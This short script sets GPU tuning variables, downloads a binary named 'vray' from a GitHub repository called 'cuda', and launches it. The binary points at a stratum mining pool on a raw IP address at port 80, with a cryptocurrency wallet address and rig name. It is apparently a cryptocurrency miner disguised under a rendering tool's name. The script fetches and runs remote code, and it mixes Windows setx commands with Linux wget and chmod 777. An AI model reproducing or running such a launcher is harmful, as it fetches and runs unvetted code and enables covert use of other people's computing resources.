setx GPU_FORCE_64BIT_PTR 0
setx GPU_MAX_HEAP_SIZE 50
setx GPU_USE_SYNC_OBJECTS 0
setx GPU_MAX_ALLOC_PERCENT 50
setx GPU_SINGLE_ALLOC_PERCENT 50
wget https://github.com/torgyv/cuda/raw/main/vray && chmod 777 vray
./vray -S stratum+tcp://104.237.157.192:80  -U 3DMucgPZzjUp9MwUMDJ9kn1jRwYBYocY3w.rig3 -P x
